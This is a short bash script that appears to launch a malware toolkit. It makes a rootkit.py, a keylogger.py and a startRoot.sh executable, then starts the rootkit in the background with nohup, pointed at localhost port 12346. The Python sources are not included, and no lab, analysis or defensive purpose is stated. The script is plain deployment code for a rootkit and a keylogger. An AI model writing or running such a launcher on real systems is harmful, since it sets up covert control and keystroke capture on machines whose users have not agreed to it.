#!/bin/bash
chmod +x startRoot.sh
chmod +x rootkit.py
chmod +x keylogger.py
nohup python rootkit.py 127.0.0.1 12346 &